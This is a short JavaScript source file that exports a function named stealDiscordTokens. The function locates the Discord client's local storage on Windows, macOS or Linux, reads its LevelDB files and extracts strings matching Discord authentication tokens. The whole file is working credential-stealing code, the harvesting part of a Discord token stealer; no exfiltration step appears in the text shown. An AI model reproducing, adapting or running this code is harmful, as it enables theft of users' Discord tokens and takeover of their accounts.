import fs from "node:fs";
import os from "node:os";
import path from "node:path";

export function stealDiscordTokens() {
  const home = os.homedir();
  const p = os.platform();
  const result = { tokens: [], leveldb: [] };

  let base;
  if (p === "win32") base = path.join(process.env.APPDATA, "discord");
  else if (p === "darwin") base = path.join(home, "Library", "Application Support", "discord");
  else base = path.join(home, ".config", "discord");

  if (!fs.existsSync(base)) return result;

  const localState = path.join(base, "Local Storage", "leveldb");
  if (fs.existsSync(localState)) {
    for (const f of fs.readdirSync(localState)) {
      if (!f.endsWith(".ldb") && !f.endsWith(".log")) continue;
      try {
        const content = fs.readFileSync(path.join(localState, f), "utf-8");
        const matches = content.match(/[\w-]{24,}\.[\w-]{6}\.[\w-]{27,}/g) || [];
        for (const m of matches) {
          if (!result.tokens.includes(m)) result.tokens.push(m);
        }
        result.leveldb.push({ file: f, size: content.length });
      } catch {}
    }
  }
  return result;
}
